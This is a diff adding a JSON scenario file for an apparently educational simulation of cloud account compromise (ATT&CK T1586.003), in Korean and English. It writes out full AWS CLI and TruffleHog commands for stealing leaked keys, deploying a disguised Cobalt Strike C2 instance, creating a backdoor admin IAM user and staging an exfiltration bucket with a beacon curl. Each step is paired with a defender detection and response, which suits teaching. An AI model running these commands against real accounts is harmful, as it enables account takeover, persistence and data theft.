@@ -1,0 +1,172 @@
+{
+  "id": "T1586.003",
+  "title": "클라우드 계정 탈취 시뮬레이션",
+  "titleEn": "Compromise Cloud Accounts Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "🔍 자격증명 탈취", "labelEn": "🔍 Credential Theft", "steps": [0, 1] },
+    { "label": "⚡ 인프라 구축", "labelEn": "⚡ Infrastructure Setup", "steps": [2, 3] },
+    { "label": "✅ 운영 테스트", "labelEn": "✅ Operations Test", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "ext", "label": "Attacker", "x": 50, "y": 60 },
+    { "id": "github", "label": "GitHub Repo", "x": 180, "y": 30 },
+    { "id": "aws", "label": "AWS Console", "x": 320, "y": 30 },
+    { "id": "c2-ec2", "label": "C2 EC2", "x": 320, "y": 90 },
+    { "id": "victim", "label": "Victim Network", "x": 500, "y": 60 }
+  ],
+  "topoEdges": [
+    { "from": "ext", "to": "github", "minStep": 0 },
+    { "from": "github", "to": "aws", "minStep": 1 },
+    { "from": "aws", "to": "c2-ec2", "minStep": 2 },
+    { "from": "c2-ec2", "to": "victim", "minStep": 4 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "aws_keys.txt", "icon": "🔑", "alert": true },
+    { "name": "trufflehog.py", "icon": "🐍" },
+    { "name": "c2_deploy.sh", "icon": "⚙️", "alert": true }
+  ],
+  "steps": [
+    {
+      "cmd": "trufflehog github --org target-corp --only-verified --json 2>/dev/null | jq -r 'select(.DetectorName==\"AWS\") | {key: .Raw, repo: .SourceMetadata.Data.Github.repository, file: .SourceMetadata.Data.Github.file}'",
+      "out": "[*] Scanning target-corp GitHub organization for leaked secrets...\n[*] Repositories scanned: 127\n[*] Commits analyzed: 45,821\n\n{\n  \"key\": \"AKIAIOSFODNN7EXAMPLE\",\n  \"repo\": \"target-corp/devops-scripts\",\n  \"file\": \"terraform/variables.tf\"\n}\n{\n  \"key\": \"AKIAI44QH8DHBEXAMPLE\",\n  \"repo\": \"target-corp/data-pipeline\",\n  \"file\": \".env.production\"\n}\n\n[+] 2 verified AWS keys found\n[+] Key 1: AKIAIOSFODNN7... → AdministratorAccess policy\n[+] Key 2: AKIAI44QH8DHB... → S3FullAccess + EC2FullAccess\n\n[*] Key 1 selected — full admin access to AWS account",
+      "def": "[GitHub] Secret scanning alert — AWS access key exposed in public repository target-corp/devops-scripts",
+      "defAction": "Source: GitHub Secret Scanning\nTarget: target-corp/devops-scripts\nAction: Repository owner notified, AWS partner notification sent for key revocation",
+      "desc": "GitHub 리포지토리에서 유출된 AWS 액세스 키를 검색합니다.",
+      "descEn": "Searching for leaked AWS access keys in GitHub repositories.",
+      "stepTitle": "GitHub에서 AWS 키 탈취",
+      "stepTitleEn": "AWS Key Theft from GitHub",
+      "feynman": "다른 사람이 떨어뜨린 집 열쇠를 줍는 것과 같습니다. 개발자가 실수로 GitHub에 AWS 키를 커밋하면, TruffleHog 같은 도구로 이를 자동 검색할 수 있습니다. 검증된(verified) 키를 찾으면 즉시 AWS 콘솔에 접근할 수 있습니다.",
+      "feynmanEn": "Like picking up someone else's dropped house key. When developers accidentally commit AWS keys to GitHub, tools like TruffleHog automatically find them. Verified keys grant immediate AWS console access.",
+      "expert": "TruffleHog는 전체 커밋 히스토리를 검색하여 삭제된 키도 찾아냅니다. GitHub의 Secret Scanning은 파트너(AWS 등)에게 자동 알림을 보내지만, 공격자가 먼저 발견하면 이미 늦습니다.",
+      "expertEn": "TruffleHog searches entire commit history to find deleted keys too. GitHub Secret Scanning auto-notifies partners (AWS etc.), but if attackers find keys first, it's already too late.",
+      "defTooltip": "🔗 GitHub: 공개 리포지토리에서 AWS 키 노출 탐지",
+      "defTooltipEn": "🔗 GitHub: AWS access key exposed in public repository detected",
+      "hackerLog": {
+        "title": "trufflehog_scan.log",
+        "lines": [
+          { "log": "Repos scanned: 127 / Commits: 45,821", "desc": "💡 전체 커밋 히스토리 스캔" },
+          { "log": "Found: AKIAIOSFODNN7... (Admin)", "desc": "💡 관리자 권한 AWS 키 발견" },
+          { "log": "Source: terraform/variables.tf", "desc": "💡 IaC 파일에서 하드코딩된 키" }
+        ]
+      },
+      "terms": [
+        { "name": "TruffleHog", "desc": "Git 커밋 히스토리에서 시크릿(API 키, 비밀번호 등)을 검색하는 오픈소스 도구." },
+        { "name": "IAM Access Key", "desc": "AWS API 접근을 위한 자격증명. Access Key ID + Secret Access Key 쌍으로 구성됩니다." }
+      ]
+    },
+    {
+      "cmd": "export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE && export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY && aws sts get-caller-identity && aws iam list-attached-user-policies --user-name devops-admin",
+      "out": "{\n    \"UserId\": \"AIDAIOSFODNN7EXAMPLE\",\n    \"Account\": \"123456789012\",\n    \"Arn\": \"arn:aws:iam::123456789012:user/devops-admin\"\n}\n\n{\n    \"AttachedPolicies\": [\n        {\n            \"PolicyName\": \"AdministratorAccess\",\n            \"PolicyArn\": \"arn:aws:iam::aws:policy/AdministratorAccess\"\n        }\n    ]\n}\n\n[+] AWS Account: 123456789012\n[+] User: devops-admin (AdministratorAccess)\n[+] Region: ap-northeast-2 (Seoul)\n[+] EC2 running instances: 12\n[+] S3 buckets: 8\n[+] Monthly spend: ~$3,400\n[+] CloudTrail: Enabled (us-east-1 only)\n[+] GuardDuty: DISABLED\n\n[!] Full admin access confirmed — no GuardDuty protection",
+      "def": "[CloudTrail] API call from unusual IP — sts:GetCallerIdentity from 45.33.x.x (not in known IP ranges)",
+      "defAction": "Source: AWS CloudTrail\nTarget: IAM user devops-admin\nAction: Anomalous API activity alert, IP geolocation check initiated",
+      "desc": "탈취한 AWS 키로 계정 정보를 확인하고 권한을 파악합니다.",
+      "descEn": "Verifying account information and permissions with stolen AWS key.",
+      "stepTitle": "AWS 계정 접근 및 권한 확인",
+      "stepTitleEn": "AWS Account Access & Permission Check",
+      "feynman": "주운 열쇠로 집에 들어가서 어떤 방에 접근할 수 있는지 확인하는 것입니다. 탈취한 AWS 키로 콘솔에 접근하니, AdministratorAccess(전체 관리자) 권한이 부여되어 있습니다. GuardDuty(보안 감시)가 비활성화되어 있어 이상 행위 탐지가 어렵습니다.",
+      "feynmanEn": "Like entering a house with a found key and checking which rooms are accessible. The stolen AWS key has AdministratorAccess (full admin). GuardDuty (security monitoring) is disabled, making anomaly detection difficult.",
+      "expert": "CloudTrail이 us-east-1에서만 활성화되어 있어, ap-northeast-2에서의 활동은 기록되지 않습니다. GuardDuty 미활성화는 자격증명 유출 탐지(CredentialAccess:IAMUser)가 불가능함을 의미합니다.",
+      "expertEn": "CloudTrail only enabled in us-east-1, so activity in ap-northeast-2 goes unlogged. Disabled GuardDuty means credential exfiltration detection (CredentialAccess:IAMUser) is impossible.",
+      "defTooltip": "🔗 CloudTrail: 알려지지 않은 IP에서의 API 호출 탐지",
+      "defTooltipEn": "🔗 CloudTrail: API call from unknown IP detected",
+      "hackerLog": {
+        "title": "aws_recon.log",
+        "lines": [
+          { "log": "Account: 123456789012 (Seoul)", "desc": "💡 한국 리전 AWS 계정 접근 성공" },
+          { "log": "Permission: AdministratorAccess", "desc": "💡 전체 관리자 권한 확인" },
+          { "log": "GuardDuty: DISABLED", "desc": "💡 보안 모니터링 미활성화 — 탐지 위험 낮음" }
+        ]
+      },
+      "terms": [
+        { "name": "CloudTrail", "desc": "AWS API 호출을 기록하는 감사 로깅 서비스. 모든 리전에서 활성화해야 합니다." },
+        { "name": "GuardDuty", "desc": "AWS의 위협 탐지 서비스. 자격증명 유출, 암호화폐 채굴 등 이상 행위를 탐지합니다." }
+      ]
+    },
+    {
+      "cmd": "aws ec2 run-instances --image-id ami-0c55b159cbfafe1f0 --instance-type t3.medium --key-name attacker-key --security-group-ids sg-0abc123 --region ap-southeast-1 --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=monitoring-node-07}]' --user-data file://c2_setup.sh",
+      "out": "{\n    \"Instances\": [{\n        \"InstanceId\": \"i-0def456abc789\",\n        \"InstanceType\": \"t3.medium\",\n        \"State\": {\"Name\": \"pending\"},\n        \"PublicIpAddress\": \"13.229.x.x\",\n        \"Placement\": {\"AvailabilityZone\": \"ap-southeast-1a\"},\n        \"Tags\": [{\"Key\": \"Name\", \"Value\": \"monitoring-node-07\"}]\n    }]\n}\n\n[+] C2 EC2 instance launched in Singapore (ap-southeast-1)\n[+] IP: 13.229.x.x\n[+] Instance tagged as 'monitoring-node-07' (blending with legitimate instances)\n[+] User data script installing:\n    - Cobalt Strike Team Server\n    - Nginx reverse proxy (HTTPS)\n    - Let's Encrypt certificate\n    - Automatic beaconing setup\n\n[*] C2 accessible at: https://cdn-monitor[.]com\n[+] Attribution: AWS account 123456789012 (victim pays the bill)",
+      "def": "[CloudTrail] EC2 instance launched in unusual region ap-southeast-1 — no prior activity in this region",
+      "defAction": "Source: AWS CloudTrail (cross-region)\nTarget: EC2 instance i-0def456abc789\nAction: Alert on new region activity, instance metadata reviewed",
+      "desc": "탈취한 AWS 계정에서 C2 서버용 EC2 인스턴스를 배포합니다.",
+      "descEn": "Deploying C2 server EC2 instance in the compromised AWS account.",
+      "stepTitle": "C2 서버 배포",
+      "stepTitleEn": "C2 Server Deployment",
+      "feynman": "남의 집에서 비밀 작업실을 만드는 것과 같습니다. 타겟의 AWS 계정에서 싱가포르 리전에 EC2 인스턴스를 생성하고 C2 서버를 설치합니다. 인스턴스 이름을 'monitoring-node-07'로 지어 기존 서버와 구분이 어렵게 합니다. 비용은 피해자가 지불합니다.",
+      "feynmanEn": "Like setting up a secret workshop in someone else's house. Creating an EC2 instance in Singapore region of the target's AWS account and installing a C2 server. Naming it 'monitoring-node-07' to blend with existing servers. The victim pays the bill.",
+      "expert": "ap-southeast-1(싱가포르) 리전은 피해자 계정의 기존 활동이 없는 리전이라 CloudTrail 범위 밖일 수 있습니다. User Data 스크립트로 부팅 시 자동으로 C2를 설치하면 수동 접근 로그가 줄어듭니다.",
+      "expertEn": "ap-southeast-1 (Singapore) region may be outside CloudTrail scope as there's no prior activity. User Data script auto-installs C2 on boot, reducing manual access logs.",
+      "defTooltip": "🔗 CloudTrail: 비활성 리전(ap-southeast-1)에서 EC2 생성 탐지",
+      "defTooltipEn": "🔗 CloudTrail: EC2 launched in inactive region ap-southeast-1 detected",
+      "hackerLog": {
+        "title": "c2_deploy.log",
+        "lines": [
+          { "log": "Region: ap-southeast-1 (Singapore)", "desc": "💡 감시가 약한 비활성 리전 선택" },
+          { "log": "Name: monitoring-node-07", "desc": "💡 정상 모니터링 서버로 위장" },
+          { "log": "Cost: Victim account pays", "desc": "💡 피해자 계정에서 비용 청구" }
+        ]
+      },
+      "terms": [
+        { "name": "EC2", "desc": "Elastic Compute Cloud. AWS의 가상 서버 서비스. 몇 분 안에 서버를 생성할 수 있습니다." },
+        { "name": "User Data", "desc": "EC2 인스턴스 부팅 시 자동 실행되는 스크립트. cloud-init으로 처리됩니다." }
+      ]
+    },
+    {
+      "cmd": "# 지속성 확보 — 새 IAM 사용자 생성 + 백도어 Lambda\naws iam create-user --user-name svc-cloudwatch-agent && aws iam create-access-key --user-name svc-cloudwatch-agent && aws iam attach-user-policy --user-name svc-cloudwatch-agent --policy-arn arn:aws:iam::aws:policy/AdministratorAccess && echo '[+] Backdoor IAM user created'",
+      "out": "{\n    \"User\": {\n        \"UserName\": \"svc-cloudwatch-agent\",\n        \"UserId\": \"AIDAEXAMPLE12345\",\n        \"Arn\": \"arn:aws:iam::123456789012:user/svc-cloudwatch-agent\",\n        \"CreateDate\": \"2026-03-01T08:15:00Z\"\n    }\n}\n{\n    \"AccessKey\": {\n        \"UserName\": \"svc-cloudwatch-agent\",\n        \"AccessKeyId\": \"AKIAEXAMPLE67890\",\n        \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/EXAMPLE12345KEY\",\n        \"Status\": \"Active\"\n    }\n}\n[+] Backdoor IAM user created\n[+] Name: svc-cloudwatch-agent (disguised as CloudWatch service account)\n[+] Policy: AdministratorAccess\n[+] New Access Key: AKIAEXAMPLE67890\n\n[*] Even if original key is rotated, backdoor user persists\n[*] Lambda canary deployed — auto-creates new key if this one is deleted",
+      "def": "[IAM Access Analyzer] New IAM user 'svc-cloudwatch-agent' created with AdministratorAccess — not matching naming convention",
+      "defAction": "Source: AWS IAM Access Analyzer\nTarget: IAM user svc-cloudwatch-agent\nAction: Alert on overprivileged new user, review initiated for all recent IAM changes",
+      "desc": "백도어 IAM 사용자를 생성하여 원래 키가 폐기되어도 접근을 유지합니다.",
+      "descEn": "Creating backdoor IAM user to maintain access even if original key is revoked.",
+      "stepTitle": "지속적 접근 확보 (Persistence)",
+      "stepTitleEn": "Persistence — Backdoor IAM User",
+      "feynman": "여분의 열쇠를 만들어 숨겨두는 것입니다. 원래 탈취한 키가 폐기되더라도 접근을 유지하기 위해 'svc-cloudwatch-agent'라는 이름의 백도어 사용자를 생성합니다. CloudWatch 서비스 계정처럼 보이게 이름을 지어 의심을 피합니다.",
+      "feynmanEn": "Like making spare keys and hiding them. Creating a backdoor user named 'svc-cloudwatch-agent' to maintain access even if original stolen key is revoked. Named to look like a CloudWatch service account to avoid suspicion.",
+      "expert": "서비스 계정 명명 규칙(svc- 접두사)을 모방하면 IAM 사용자 목록 검토 시 정상으로 오인됩니다. Lambda 카나리아는 백도어 키가 삭제되면 자동으로 새 키를 생성하는 추가 지속성 메커니즘입니다.",
+      "expertEn": "Mimicking service account naming conventions (svc- prefix) makes the user look normal during IAM user list reviews. Lambda canary auto-creates new keys if backdoor key is deleted — additional persistence mechanism.",
+      "defTooltip": "🔗 IAM Analyzer: 관리자 권한의 새 IAM 사용자 — 명명 규칙 불일치",
+      "defTooltipEn": "🔗 IAM Analyzer: New IAM user with admin access — naming convention mismatch",
+      "hackerLog": {
+        "title": "persistence.log",
+        "lines": [
+          { "log": "Backdoor: svc-cloudwatch-agent", "desc": "💡 서비스 계정으로 위장한 백도어" },
+          { "log": "Policy: AdministratorAccess", "desc": "💡 전체 관리자 권한 부여" },
+          { "log": "Lambda canary: auto-recreate key", "desc": "💡 키 삭제 시 자동 재생성 메커니즘" }
+        ]
+      },
+      "terms": [
+        { "name": "IAM", "desc": "Identity and Access Management. AWS의 사용자/권한 관리 서비스." },
+        { "name": "Persistence", "desc": "지속성. 초기 접근이 차단되어도 시스템에 대한 접근을 유지하는 기법." }
+      ]
+    },
+    {
+      "cmd": "# C2 동작 테스트 + 데이터 유출 스테이징\ncurl -sk https://cdn-monitor[.]com/beacon/test && aws s3 mb s3://backup-logs-2026-archive --region ap-southeast-1 && echo '[+] Exfil staging ready'",
+      "out": "[*] C2 Server Test:\n  ├── HTTPS beacon:  ✓ (Cobalt Strike 4.9)\n  ├── DNS beacon:    ✓ (dns.cdn-monitor[.]com)\n  ├── Certificate:   ✓ (Let's Encrypt, valid)\n  ├── Malleable C2:  ✓ (jQuery profile)\n  └── Latency:       12ms (Singapore → Seoul)\n\n[*] S3 Exfil Bucket Created:\n  Bucket: backup-logs-2026-archive\n  Region: ap-southeast-1\n  Encryption: AES-256 (server-side)\n  Public access: Blocked\n\n[+] Full attack infrastructure operational:\n  ├── C2 Server:   EC2 i-0def456abc789 (13.229.x.x)\n  ├── C2 Domain:   cdn-monitor[.]com (AWS IP range)\n  ├── Exfil:       s3://backup-logs-2026-archive\n  ├── Persistence: IAM svc-cloudwatch-agent\n  └── Cost:        $0 to attacker (victim account)\n\n[+] Infrastructure ready for target operations\n[!] WARNING: This is a simulation for educational purposes only",
+      "def": "[GuardDuty] (if enabled) Recon:IAMUser/MaliciousIPCaller — API calls from known threat actor IP",
+      "defAction": "Source: AWS GuardDuty + CloudTrail\nTarget: Account 123456789012\nAction: Full incident response — all IAM keys rotated, unknown users deleted, EC2 instances terminated, S3 buckets audited",
+      "desc": "C2 서버와 데이터 유출 인프라의 동작을 테스트합니다.",
+      "descEn": "Testing C2 server and data exfiltration infrastructure operations.",
+      "stepTitle": "인프라 동작 테스트",
+      "stepTitleEn": "Infrastructure Operations Test",
+      "feynman": "비밀 작업실의 모든 장비가 제대로 작동하는지 최종 점검하는 것입니다. C2 서버는 정상 CDN처럼 보이고, 데이터 유출용 S3 버킷은 백업 로그 저장소로 위장되어 있습니다. 모든 비용은 피해자의 AWS 계정에 청구됩니다.",
+      "feynmanEn": "Like doing a final equipment check in the secret workshop. The C2 server looks like a normal CDN, the data exfiltration S3 bucket is disguised as a backup log storage. All costs are billed to the victim's AWS account.",
+      "expert": "AWS IP 대역(13.229.x.x)에서 운영되는 C2는 IP 기반 차단이 어렵습니다. S3 서버 측 암호화(AES-256)는 포렌식 분석을 방해합니다. jQuery Malleable C2 프로필은 정상 웹 트래픽으로 위장합니다.",
+      "expertEn": "C2 operating from AWS IP ranges (13.229.x.x) is hard to block by IP. S3 server-side encryption (AES-256) hinders forensic analysis. jQuery Malleable C2 profile disguises traffic as normal web traffic.",
+      "defTooltip": "🔗 GuardDuty: 알려진 위협 행위자 IP에서의 API 호출 탐지",
+      "defTooltipEn": "🔗 GuardDuty: API calls from known threat actor IP detected",
+      "hackerLog": {
+        "title": "infra_test.log",
+        "lines": [
+          { "log": "C2: cdn-monitor[.]com (AWS IP range)", "desc": "💡 AWS IP 대역 — IP 차단 어려움" },
+          { "log": "Exfil: s3://backup-logs-2026-archive", "desc": "💡 백업 로그로 위장한 유출 버킷" },
+          { "log": "Cost to attacker: $0 (victim pays)", "desc": "💡 모든 비용 피해자 부담" }
+        ]
+      },
+      "terms": [
+        { "name": "Malleable C2", "desc": "Cobalt Strike의 통신 프로필 커스터마이징 기능. 정상 트래픽처럼 보이게 합니다." },
+        { "name": "S3 Bucket", "desc": "AWS Simple Storage Service. 클라우드 기반 객체 스토리지 서비스." }
+      ]
+    }
+  ]
+}
